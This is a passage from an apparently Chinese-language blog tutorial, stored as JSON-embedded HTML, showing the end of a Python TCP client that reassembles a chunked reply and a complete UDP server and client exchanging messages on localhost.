punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\"># 将结果解码，如果不解码，打印的结果中前面会多一个 “b” 例如：b\"593\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    client<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"已收到发的数据。\"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>     <span class=\"token comment\"># 防止黏包，只有 TCP 有粘包现象，UDP 永远不会粘包</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    data_size <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 数据的起始值</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    data_total <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span>  <span class=\"token comment\"># 空值，用于和后面接收的数据拼接起来，形成完整的响应数据</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">while</span> data_size <span class=\"token operator\">!=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cmd_size<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># 判断服务端发送的大小和客户端接收的大小是否一致，一致表示全部接收，不一致时一直循环接收数据</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        data <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收的是 bytes 类型</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        data_size <span class=\"token operator\">+=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\"># 接收的数据大小，这里的汉字也变成了 bytes 类型，一个汉字为 3 个字符，和服务端一致</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data_total <span class=\"token operator\">+=</span> data  <span class=\"token comment\"># 这里不能解码，因为拼接的类型就是 bytes 类型</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"实际接收的大小：\"</span><span class=\"token punctuation\">,</span> data_size<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 实际接收的总数据大小</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data_total<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将所有接收到的结果进行解码，得到可见的结果</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv done ......\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>client<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"udp\"><a class=\"anchor\" href=\"#udp\">#</a> UDP</h2>\n<p>这仅仅是一个简单的 socket 通信脚本</p>\n<h3 id=\"udp服务端server\"><a class=\"anchor\" href=\"#udp服务端server\">#</a> UDP 服务端（server）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>UDP 服务端</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>accept()和connect()方法都不需要</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre># 接收客户端传来的数据 recvfrom接收客户端的数据，默认是阻塞的，直到有客户端传来数据</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        # recvfrom 参数的意义，表示最大能接收多少数据，单位是字节</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        # recvfrom返回值说明</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        # receive_data表示接受到的传来的数据,是bytes类型</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        # client  表示传来数据的客户端的身份信息，客户端的ip和端口，元组</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre># 创建一个套接字socket对象，用于进行通讯</pre></td></tr><tr><td data-num=\"13\"></td><td><pre># # socket.AF_INET 指明使用INET地址集，进行网间通讯</pre></td></tr><tr><td data-num=\"14\"></td><td><pre># # socket.SOCK_DGRAM 指明使用数据协议，即使用传输层的udp协议</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">import</span> socket  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">import</span> time  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># server 接收端</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>server_socket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_DGRAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9977</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>server_socket<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>server_socket<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 设置一个时间提示，如果 10 秒钟没接到数据进行提示</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ヽ(ー_ー)ノ启动socket服务，等待客户端连接...'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        now <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 获取当前时间</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        receive_data<span class=\"token punctuation\">,</span> client <span class=\"token operator\">=</span> server_socket<span class=\"token punctuation\">.</span>recvfrom<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        server_socket<span class=\"token punctuation\">.</span>sendto<span class=\"token punctuation\">(</span><span class=\"token string\">\"服务器已收到你的信息la(๑╹ヮ╹๑)ﾉ \"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> client<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> receive_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token string\">\"结束通讯 (￢_￢)瞄\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token string\">'%Y-%m-%d %H:%M:%S'</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>now<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以指定格式显示时间</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"收到(*￣︶￣)来自客户端&#123;&#125;端口为&#123;&#125;,发送的\\n*********\\n&#123;&#125;\\n*********\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>client<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> client<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> receive_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">except</span> socket<span class=\"token punctuation\">.</span>timeout<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果 10 秒钟没有接收数据进行提示</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"10秒没理我la(^_−)☆\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"udp客户端client\"><a class=\"anchor\" href=\"#udp客户端client\">#</a> UDP 客户端（client）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>UDP</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>客户端</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>创建套接字，连接远端地址</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>连接后发送数据和接受数据</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>传输完毕，关闭套接字</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># client 发送端</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>client_socket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_DGRAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>server_address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9977</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收方 服务器的 ip 地址和端口号</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token string\">'%Y-%m-%d %H:%M:%S'</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以指定格式显示当前时间</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    msg <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(*^▽^*)客户端，请输入要发送的内容：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    client_socket<span class=\"token punctuation\">.</span>sendto<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> server_address<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将 msg 内容发送给指定接收方</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token string\">\"结束通讯 (￢_￢)瞄\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    receive_data<span class=\"token punctuation\">,</span> server <span class=\"token operator\">=</span> client_socket<span class=\"token punctuation\">.</span>recvfrom<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(︶.̮︶✽)接收到来自&#123;&#125;端口为&#123;&#125;的信息:\\n**********\\n&#123;&#125;\\n**********\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>server<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> server<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> receive_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "socket"
            ]
        }
    ]
}